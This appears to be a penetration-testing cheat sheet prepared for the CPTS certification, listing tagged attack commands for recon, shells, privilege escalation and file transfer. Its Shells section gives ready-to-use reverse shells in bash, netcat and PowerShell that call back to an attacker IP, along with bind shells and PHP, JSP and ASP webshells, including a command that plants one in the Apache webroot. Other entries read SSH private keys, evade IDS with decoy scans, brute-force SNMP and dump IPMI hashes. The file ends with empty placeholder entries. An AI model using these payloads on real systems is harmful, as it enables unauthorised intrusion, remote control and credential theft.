# CPTS

% CPTS

## Service scanning - banner grabbing - Getting started 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
nc -nv <targetIP> <port>
```

## Service scanning - banner grabbing (nmap) - Getting started 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
nmap -sV --script=banner -p<port>
```

## Service scanning - ftp connection - Getting started 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
ftp <targetIP> <port>
```

## Service scanning - smb shares list with null session - Getting started 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
smbclient -L -N \\\\<taretIP>
```

## Service scanning - smb shares list with user - Getting started 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
smbclient -L -U <username> \\\\<taretIP>
```

## Web enumeration - gobuster directory enumeration - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
gobuster dir -u <targetURL> -w <wlist>
```

## Web enumeration - technology identification w/ whatweb - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
whatweb <targetURL>
```

## Public exploits - find public exploits searchsploit - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
searchsploit <technology-version>
```

## Shells - revshell command linux (bash) - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
bash -c 'bash -i >& /dev/tcp/<attackerIP>/<port> 0>&1'
```

## Shells - revshell command linux (bash 2) - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackerIP> <port> >/tmp/f
```

## Shells - revshell command linux (windows powershell) - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attackerIP>',<port>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

## Shells - revshell web revshells.com - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
firefox https://www.revshells.com/
```

## Shells - nc listener for revshell - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
nc -lvnp <port>
```


## Shells - bind shell linux (bash) 0.0.0.0 - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <port> >/tmp/f
```

## Shells - bind shell python 0.0.0.0 - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",<port>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

## Shells - bind shell powershell 0.0.0.0 - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]<port>; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

## Shells - nc bind shell connection - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
nc <remoteHostIP> <port>
```

## Shells - upgrading TTY (python) - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Shells - upgrading TTY (python) -> ctrl+z -> stty raw -echo -> fg - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Shells - upgrading TTY terminal resize (extract values from our terminal) - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
echo $TERM; stty size
```

## Shells - upgrading TTY remote terminal resize (on the target terminal) - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
export TERM=<terminal-type>; stty rows <rows> columns <columns>
```

## Shells - php webshell - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
<?php system($_REQUEST["cmd"]); ?>
```

## Shells - jsp webshell - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

## Shells - asp webshell - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
<% eval request("cmd") %>
```

## Shells - webroots - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
echo ""
echo ""
echo ""
echo "apache -> /var/www/html"
echo "nginx -> /usr/local/nginx/html"
echo "iis -> c:\\inetpub\\wwwroot"
echo "xampp -> C:\\xampp\\htdocs"
```

## Shells - cmd injection example webshell to apache webroot - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

## Shells - cmd injection example webshell to apache webroot (execution) - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
http://<targetIP-URL>:<port>/shell.php?cmd=<command>
```

## Privesc - hacktricks linux privesc checklist - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
firefox https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
```

## Privesc - PayloadsAllTheThings linux privesc checklist - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
firefox https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
```

## Privesc - hacktricks windows privesc checklist - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
firefox https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
```

## Privesc - PayloadsAllTheThings windows privesc checklist - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
```

## Privesc - GTFOBINS linux privesc - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
firefox https://gtfobins.github.io/
```

## Privesc - LOLBAS windows privesc - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
firefox https://lolbas-project.github.io/#
```

## Privesc - read crontabs - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
ls -la /etc/crontab; ls -la /etc/cron.d; ls -la /var/spool/cron/crontabs/root 
```

## Privesc - read ssh keys (read permissions over the .ssh folder) - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
cat /home/user/.ssh/id_rsa; cat /root/.ssh/id_rsa 
```

## Privesc - ssh connection using key - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
chmod 600 <keyFile>; ssh <username>@<targetIP> -i <keyFile>
```

## Privesc - write ssh key to remote host (write permissions over the .ssh folder) - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
ssh-keygen -f <fileName>; echo "copy the <fileName>.pub to the remote host (/home/user/.ssh/authorized_keys) -> then use the <fileName> to connect ssh <username>@<targetIP> -i <fileName>" 
```

## File transfers - python server - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
 ifconfig; python3 -m http.server 1234
```

## File transfers - pull files wget - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
 wget http://<attackerIP>:<port>/<file2pull>
```

## File transfers - pull files curl - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
 curl http://<attackerIP>:<port>/<file2pull> -o <fileOutName>
```

## File transfers - upload with scp - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
scp <fileName> <username>@<ip>:<outPath>
```

## File transfers - pull with scp - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
scp <username>@<ip>:<filePath> <localPath>
```

## File transfers - base64 - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
base64 <fileName> -w 0
```

## File transfers - base64 - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
echo "base64here" | base64 -d > <outFileName>
```

## File transfers - validating file transfer file - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
file <fileName>
```

## File transfers - validating file transfer hash - Getting started
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
md5sum <fileName>
```

## Network enumeration with nmap - Host discovery - scan network range 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <netRange.0>/<mask> -sn -oA <outFileNameBase> | grep for | cut -d" " -f5
```

## Network enumeration with nmap - ping scan with ICMP echo request 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <targetIP> -sn -oA <outBaseName> -PE --reason --disable-arp-ping 
```

## Network enumeration with nmap - generate HTML report from nmap scan
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
xsltproc <xmlNmapOutFile> -o <outNameHTMLreport>.html
```

## Network enumeration with nmap - banner grabbig (tcpdump) - part 1 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo tcpdump -i <interface> host <host1> and <host2>
```

## Network enumeration with nmap - banner grabbig (tcpdump) - part 2
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
nc -nv <targetIP> <port>
```

## Network enumeration with nmap - banner grabbig
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
nc -nv <targetIP> <port>
```

## Network enumeration with nmap - default scripts scan
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
nmap <targetIP> -sC
```

## Network enumeration with nmap - category scripts scan
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <targetIP> --script <category>
```

## Network enumeration with nmap - aggressive scan
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <targetIP> -A
```

## Network enumeration with nmap - nmap VA
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <targetIP> -sV --script vuln 
```

## Network enumeration with nmap - optimized RTT (Round-Trip-Time)
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <targetIP> --initial-rtt-timeout 50ms --max-rtt-timeout 100ms
```

## Network enumeration with nmap - max packet retries for ports to 15
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <targetIP> --max-retries 15
```

## Network enumeration with nmap - bandwidth min rate to spped up the scan (if we know it)
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <targetIP> --min-rate 300
```

## Network enumeration with nmap - ACK-Scan - Firewall - IDS/IPS evation
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <targetIP> -sA -Pn -n --disable-arp-ping --packet-trace
```

## Network enumeration with nmap - hide IP scan by using decoys
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <targetIP> -Pn -n --disable-arp-ping --packet-trace -D RND:5
```

## Network enumeration with nmap - diferent source ip
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <targetIP> -n -Pn -S <sourceIPtoUse> -e <interface>
```

## Network enumeration with nmap - DNS proxying - with source port
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <targetIP> -Pn -n --disable-arp-ping --packet-trace --source-port <sourcePort>
```

## Footprinting - infra based enum - certificate transparency 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
curl -s https://crt.sh/\?q\=<target-domain>\&output\=json | jq .
```

## Footprinting - infra based enum - certificate transparency (get just the subdomains)
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
curl -s https://crt.sh/\?q\=<target-domain>\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u | tee subdomainlist
```

## Footprinting - infra based enum - certificate transparency (company hosted servers)
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
for i in $(cat subdomainlist);do host $i | grep "has address" | grep <targetIP> | cut -d" " -f4 >> ip-addresses.txt;done
```

## Footprinting - infra based enum - scan IPs address in a list using shodan
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
for i in $(cat ip-addresses.txt);do shodan host $i;done
```

## Footprinting - infra based enum - dns records
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
dig any <targetDomain>
```

## Footprinting - infra based enum - cloud resources - company hosted servers
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
for i in $(cat subdomainlist);do host $i | grep "has address" | grep <targetIP> | cut -d" " -f1,4;done
```

## Footprinting - host-based enumeration - interact with the ftp service on the target
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
ftp <targetIP>
```

## Footprinting - infra based enum - interact with the ftp service on the target netcat
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
nc -nv <targetIP> 21
```

## Footprinting - infra based enum -interact with the ftp service on the target telnet
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
telnet <targetIP> 21
```

## Footprinting - infra based enum - interact with the FTP service on the target using encrypted connection.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
openssl s_client -connect <targetIP>:21 -starttls ftp
```

## Footprinting - infra based enum - download all available files on the target ftp server.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
wget -m --no-passive ftp://<username>:<password>@<target>
```

## Footprinting - infra based enum - Null session authentication on SMB.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
smbclient -N -L //<targetIP>
```

## Footprinting - infra based enum - Connect to a specific SMB share.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
smbclient //<targetIP>/<share>
```

## Footprinting - infra based enum - Interaction with the target using RPC.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
rpcclient -U "" <targetIP>
```

## Footprinting - infra based enum - Username enumeration using Impacket scripts.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
samrdump.py <targetIP>
```

## Footprinting - infra based enum - Enumerating SMB shares.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
smbmap -H <targetIP>
```

## Footprinting - infra based enum - Enumerating SMB shares using null session authentication.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
nxc smb <targetIP> --shares -u '' -p ''
```

## Footprinting - infra based enum - SMB enumeration using enum4linux.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
enum4linux-ng.py <targetIP> -A
```

## Footprinting - infra based enum - SMB RID user brute forcing.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
for i in $(seq 500 1100);do rpcclient -N -U "" <targetIP> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

## Footprinting - infra based enum - NFS nmap footprinting.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <targetIP> -p111,2049 -sV -sC
```

## Footprinting - infra based enum - NFS nmap footprinting.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap --script nfs* <targetIP> -sV -p111,2049
```

## Footprinting - infra based enum - Show available NFS shares.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
showmount -e <targetIP>
```

## Footprinting - infra based enum - Mount the specific NFS share to ./target-NFS
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
mount -t nfs <targetIP>:/<share> ./<localFolderForNFS>/ -o nolock
```

## Footprinting - infra based enum - Unmount the specific NFS share.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
umount ./<localFolderForNFS>
```

## Footprinting - infra based enum - DNS - NS request to the specific nameserver.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
dig ns <domain-tld> @<nameserver>
```

## Footprinting - infra based enum - ANY request to the specific nameserver.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
dig any <domain-tld> @<nameserver>
```

## Footprinting - infra based enum - AXFR request to the specific nameserver.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
dig axfr <domain-tld> @<nameserver>
```

## Footprinting - infra based enum - DNS subdomain bruteforcing dnsenum
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o <foundSubdomainsList> -f ~/<subdomainsList> <domain-tld>
```

## Footprinting - infra based enum - SMTP interaction
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
telnet <targetIP> 25
```

## Footprinting - infra based enum - SMTP nmap scan for open relay
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

## Footprinting - infra based enum - SMTP username enumeration with 10s wait for response 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
smtp-user-enum -M RCPT -U <usernamesWordlist> -t <targetIP> -w 10
```

## Footprinting - infra based enum - IMAP/POP3 scan
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <targetIP> -sV -p110,143,993,995 -sC
```

## Footprinting - infra based enum - Log in to the IMAPS service using cURL.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
curl -k 'imaps://<targetIP>' --user <user>:<password>
```

## Footprinting - infra based enum - Connect to the IMAPS service.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
openssl s_client -connect <targetIP>:imaps
```

## Footprinting - infra based enum - Connect to the POP3s service.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
openssl s_client -connect <targetIP>:pop3s
```

## Footprinting - infra based enum - Querying OIDs using snmpwalk.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
snmpwalk -v2c -c <communityString> <targetIP>
```

## Footprinting - infra based enum - Bruteforcing community strings of the SNMP service.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
onesixtyone -c <seclists-Discovery-SNMP-snmp-txt> <targetIP>
```

## Footprinting - infra based enum - Bruteforcing SNMP service OIDs.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
braa <community string>@<targetIP>:.1.*
```

## Footprinting - infra based enum - nmap MySQL.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap <targetIP> -sV -sC -p3306 --script mysql*
```

## Footprinting - infra based enum - Connect to the MySQL server.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
mysql -u <user> -p<password> -h <targetIP> --skip-ssl
```

## Footprinting - infra based enum - nmap MSSQL.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <targetIP>
```

## Footprinting - infra based enum - Log in to the MSSQL server using Windows authentication.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
mssqlclient.py <user>@<targetIP> -windows-auth
```

## Footprinting - infra based enum - MSSQL ping metasploit module.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
msf6 auxiliary(scanner/mssql/mssql_ping)
```

## Footprinting - infra based enum - Oracle TNS required tools to enumerate.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
```

## Footprinting - infra based enum - Oracle TNS nmap.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap -p1521 -sV <targetIP> --open
```

## Footprinting - infra based enum - Oracle TNS sid brute forcing with nmap.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap -p1521 -sV <targetIP> --open --script oracle-sid-brute
```

## Footprinting - infra based enum - Oracle TNS.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
./odat.py all -s <targetIP>
```

## Footprinting - infra based enum - Oracle TNS connection.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sqlplus <username>/<password>@<targetIP>/XE
```

## Footprinting - infra based enum - Oracle TNS file upload.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
./odat.py utlfile -s <targetIP> -d XE -U <username> -P <password> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

## Footprinting - infra based enum - IPMI nmap.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap -sU --script ipmi-version -p 623 <targetIP-domain>
```

## Footprinting - infra based enum - IPMI version detection.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
msf6 auxiliary(scanner/ipmi/ipmi_version)
```

## Footprinting - infra based enum - Dump IPMI hashes.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)
```

## Footprinting - infra based enum - Remote security audit against the target SSH service.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
ssh-audit.py <targetIP>
```

## Footprinting - infra based enum - Log in to the SSH server using the SSH client.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
ssh <user>@<targetIP>
```

## Footprinting - infra based enum - Log in to the SSH server using private key.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
ssh -i private.key <user>@<targetIP>
```

## Footprinting - infra based enum - Enforce password-based authentication.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
ssh <user>@<targetIP> -o PreferredAuthentications=password
```

## Footprinting - infra based enum - scanning for rsync.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap -sV -p 873 <targetIP-most-likely-to-be-local>
```

## Footprinting - infra based enum - rsync proving for accesible shares.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
nc -nv 127.0.0.1 873
```

## Footprinting - infra based enum - rsync enumerating an open share.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
rsync -av --list-only rsync://127.0.0.1/dev
```

## Footprinting - infra based enum - r-services.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
sudo nmap -sV -p 512,513,514 <targetIP>
```

## Footprinting - infra based enum - r-services check trusted users and IPs.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
cat .rhosts
```

## Footprinting - infra based enum - r-services login.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
rlogin <targetIP> -l <username>
```

## Footprinting - infra based enum - r-services Listing Authenticated Users Using Rwho.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
rwho
```

## Footprinting - infra based enum - r-services Listing Authenticated Users Using Rusers.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
rusers -al <targetIP>
```

## Footprinting - infra based enum - RDP nmap.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
nmap -sV -sC <targetIP> -p3389 --script rdp*
```

## Footprinting - infra based enum - Check the security settings of the RDP service.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
rdp-sec-check.pl <targetIP>
```

## Footprinting - infra based enum - Log in to the RDP server from Linux.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
xfreerdp3 /u:<user> /p:"<password>" /v:<targetIP>
```

## Footprinting - infra based enum - WinRM nmap.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
nmap -sV -sC <targetIP> -p5985,5986 --disable-arp-ping -n
```

## Footprinting - infra based enum - Log in to the WinRM server.
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
evil-winrm -i <targetIP> -u <user> -p <password>
```

## Footprinting - infra based enum - WMIexec 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
wmiexec.py <user>:"<password>"@<targetIP> "<system command>"
```

## Information Gathering web - DNS - subdomain enumeration
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
dnsenum --enum <domain> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r
```

## Information Gathering web - vHosts detection gobuster
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
gobuster vhost -u http://<target_IP_address> -w <wordlist_file> --append-domain
```

## Information Gathering web - vHosts detection ffuf
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
ffuf -w <wlist>:FUZZ -u <targetURL> -H 'Host: FUZZ.<targetDomain>' -ic -c
```

## Information Gathering web - certificate transparency logs for subdomains - crt.sh
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
curl -s "https://crt.sh/?q=<targetDomain>&output=json" | jq -r '.[]
 | select(.name_value | contains("dev")) | .name_value' | sort -u
```

## Information Gathering web - fingerprinting - banner grabbing web
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
curl -I <targetDomain>
```

## Information Gathering web - fingerprinting - WAF detection
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
wafw00f <targetDomain>
```

## Information Gathering web - fingerprinting - web technologies with nikto
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
nikto -h <targetDomain> -Tuning b
```

## Information Gathering web - crawling - scrapy ReconSpider (use a venv)
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
python3 ReconSpider.py http://inlanefreight.com
```

## Information Gathering web - dorks - find login pages
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
site:example.com inurl:login
site:example.com (inurl:login OR inurl:admin)
```

## Information Gathering web - dorks - Identifying Exposed Files
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
site:example.com filetype:pdf
site:example.com (filetype:xls OR filetype:docx)
```

## Information Gathering web - dorks - Uncovering Configuration Files
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
site:example.com inurl:config.php
site:example.com (ext:conf OR ext:cnf)
```

## Information Gathering web - dorks - Locating Database Backups
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
site:example.com inurl:backup
site:example.com filetype:sql
```

## Information Gathering web - automate recon - FinalRecon
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```
./finalrecon.py --headers --whois --url <targetURL>
```

## File Transfers - 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```

```

## File Transfers - 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```

```

## File Transfers - 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```

```

## File Transfers - 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```

```

## File Transfers - 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```

```

## File Transfers - 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```

```

## File Transfers - 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```

```

## File Transfers - 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```

```

## File Transfers - 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```

```

## File Transfers - 
#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
```

```
